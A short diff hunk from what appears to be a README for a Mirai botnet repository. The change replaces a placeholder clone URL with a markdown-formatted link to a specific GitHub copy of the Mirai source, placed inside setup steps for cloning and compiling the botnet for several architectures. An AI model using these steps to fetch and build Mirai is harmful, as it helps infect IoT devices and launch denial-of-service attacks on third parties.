@@ -35,7 +35,7 @@ Mirai was initially developed by Paras Jha, who released the source code in 2016
 2. **Download and compile the source:**
    - Clone this repo:
      ```bash
-     git clone https://github.com/yourrepo/mirai-botnet
+     git clone [https://github.com/yourrepo/mirai-botnet](https://github.com/braxtonculver/Mirai.git)
      cd mirai-botnet
      ```
    - Compile the code for different architectures:
